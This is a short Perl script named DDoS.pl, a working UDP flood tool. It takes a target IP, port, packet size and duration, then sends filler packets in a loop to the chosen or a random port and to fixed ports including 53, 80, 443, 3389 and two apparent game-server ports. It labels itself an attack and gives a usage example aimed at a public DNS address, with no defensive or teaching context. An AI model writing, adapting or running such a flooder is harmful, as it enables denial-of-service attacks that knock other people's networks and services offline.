#!/usr/bin/perl

#Args
# 1 - IP
# 2 - Port
# 3 - Size of the packet to send
# 4 - Time in secondes
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "-Tip on use : perl DDoS.pl 8.8.8.8 80 2048 500\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~To cancel the attack press \'Ctrl-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(5000-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("53", $iaddr));
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("3389", $iaddr));
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("443", $iaddr));
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("80", $iaddr));
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("17091", $iaddr));
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in("19132", $iaddr));
  };
